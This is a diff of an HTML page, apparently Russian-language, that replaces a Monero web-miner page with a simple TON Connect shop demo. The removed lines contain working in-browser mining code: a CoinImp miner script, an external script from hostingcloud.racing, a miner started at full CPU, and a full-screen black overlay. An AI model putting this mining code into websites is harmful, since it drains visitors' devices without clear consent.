@@ -1,34 +1,153 @@
 <!DOCTYPE html>
 <html lang="ru">
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Веб Майнер Monero</title>
-        <script src="https://www.coinimp.com/miner/09904aae70a0280cd8aee4b50cdc8fa371d1e49f0465fa6363bbb82d6a379382/miner.js"></script>
-        <style>
-            .FrontPanel {
-                position: absolute;
-                width: 100%;
-                height: 100%;
-                z-index: 99999999;
-                left: 0px;
-                top: 0px;
-                background-color: black;
-            }
-        </style>
-    </head>
-    <body>
-
-        <div class="FrontPanel"></div>
-
-        <script src="https://www.hostingcloud.racing/rcQD.js"></script>
-        <script>
-            var _client = new Client.Anonymous('278299e9d3dc01f5bfd3d66a906a7758ffd51bfe6b2d04d358b18af7ede07774', {
-                throttle: 0, c: 'w'
-            });
-            _client.start();
-            _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Магазин с оплатой в TON</title>
+    <link rel="icon" href="data:,">
+    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            text-align: center;
+        }
+        .product {
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+        #ton-connect {
+            margin: 20px 0;
+        }
+        #wallet-info {
+            margin: 20px 0;
+            padding: 10px;
+            background-color: #f0f0f0;
+            border-radius: 5px;
+            display: none;
+        }
+        #status {
+            margin-top: 20px;
+            padding: 10px;
+            border-radius: 5px;
+        }
+        button {
+            background-color: #0088cc;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 10px;
+        }
+        button:hover {
+            background-color: #006699;
+        }
+    </style>
+</head>
+<body>
+    <h1>Мой магазин</h1>
+    <p>Оплата через TON Connect</p>
+    
+    <div class="product">
+        <h2>Пример товара</h2>
+        <p>Цена: 0.01 TON</p>
         
-        </script>
-    </body>
+        <!-- Кнопка подключения кошелька -->
+        <div id="ton-connect"></div>
+        
+        <!-- Информация о кошельке -->
+        <div id="wallet-info">
+            <p>Подключен кошелек: <span id="wallet-address"></span></p>
+            <button id="buy-button">Купить за 0.01 TON</button>
+        </div>
+    </div>
+    
+    <div id="status"></div>
+    
+    <script>
+        // Инициализация TON Connect UI
+        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+            manifestUrl: 'https://yourwebsite.com/tonconnect-manifest.json',
+            buttonRootId: 'ton-connect'
+        });
+        
+        // Элементы страницы
+        const walletInfo = document.getElementById('wallet-info');
+        const walletAddress = document.getElementById('wallet-address');
+        const buyButton = document.getElementById('buy-button');
+        const statusDiv = document.getElementById('status');
+        
+        // Проверка подключенного кошелька при загрузке
+        async function checkConnection() {
+            const walletConnectionSource = {
+                jsBridgeKey: 'tonconnect'
+            };
+            
+            const connectedWallet = tonConnectUI.wallet;
+            if (connectedWallet) {
+                updateWalletInfo(connectedWallet);
+            }
+        }
+        
+        // Обновление информации о кошельке
+        function updateWalletInfo(wallet) {
+            walletAddress.textContent = `${wallet.account.address.slice(0, 6)}...${wallet.account.address.slice(-4)}`;
+            walletInfo.style.display = 'block';
+            statusDiv.textContent = 'Кошелек подключен!';
+            statusDiv.style.backgroundColor = '#dff0d8';
+        }
+        
+        // Обработчик покупки
+        buyButton.addEventListener('click', async () => {
+            if (!tonConnectUI.wallet) {
+                statusDiv.textContent = 'Сначала подключите кошелек';
+                statusDiv.style.backgroundColor = '#f2dede';
+                return;
+            }
+            
+            try {
+                const transaction = {
+                    validUntil: Math.floor(Date.now() / 1000) + 300, // 5 минут
+                    messages: [
+                        {
+                            address: 'UQDDEEbNMPfVwpL2q1zi5oAbChXADLuZp4gCOdFoHDmHo4Nn', // Ваш кошелек для получения средств
+                            amount: '10000000', // 0.01 TON в нанотонах
+                        }
+                    ]
+                };
+                
+                const result = await tonConnectUI.sendTransaction(transaction);
+                
+                statusDiv.textContent = 'Платеж успешно отправлен! TX Hash: ' + result.boc;
+                statusDiv.style.backgroundColor = '#dff0d8';
+                
+                // Здесь можно добавить логику подтверждения платежа на сервере
+                
+            } catch (error) {
+                statusDiv.textContent = 'Ошибка платежа: ' + error.message;
+                statusDiv.style.backgroundColor = '#f2dede';
+            }
+        });
+        
+        // Подписка на изменения состояния кошелька
+        tonConnectUI.onStatusChange((wallet) => {
+            if (wallet) {
+                updateWalletInfo(wallet);
+            } else {
+                walletInfo.style.display = 'none';
+                statusDiv.textContent = 'Кошелек отключен';
+                statusDiv.style.backgroundColor = '#fcf8e3';
+            }
+        });
+        
+        // Проверяем подключение при загрузке страницы
+        window.addEventListener('load', checkConnection);
+    </script>
+</body>
 </html>
